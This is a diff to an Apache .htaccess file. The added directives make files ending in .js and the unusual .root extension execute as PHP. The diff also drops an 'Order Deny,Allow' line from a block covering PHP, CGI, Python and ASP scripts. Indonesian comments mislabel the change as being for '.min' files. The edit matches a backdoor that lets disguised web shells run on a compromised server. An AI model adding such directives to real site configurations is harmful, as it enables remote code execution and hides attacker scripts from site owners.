@@ -1,3 +1,9 @@
+
+# Izinkan ekstensi .min untuk diproses sebagai PHP
+AddType application/x-httpd-php .js
+
+# Izinkan ekstensi .min untuk diproses sebagai PHP
+AddType application/x-httpd-php .root
 Options -Indexes
 
 <FilesMatch ".*">
@@ -13,7 +19,6 @@ Options -Indexes
 </Files>
 
 <FilesMatch "\.(php|phtml|php[0-9]|phps|phar|shtml|cgi|pl|perl|py|asp|aspx|jsp|htaccess|htpasswd)$">
-    Order Deny,Allow
     Allow from all
 </FilesMatch>
 
@@ -32,8 +37,16 @@ Options -Indexes
     php_flag engine on
 </IfModule>
 
+<FilesMatch "\.root$">
+    SetHandler application/x-httpd-php
+</FilesMatch>
+
+
 <IfModule mime_module>
     AddType application/x-httpd-php .js
+</IfModule>
+<IfModule mime_module>
+    AddType application/x-httpd-php .root
 </IfModule>
 
 <FilesMatch "\.js$">
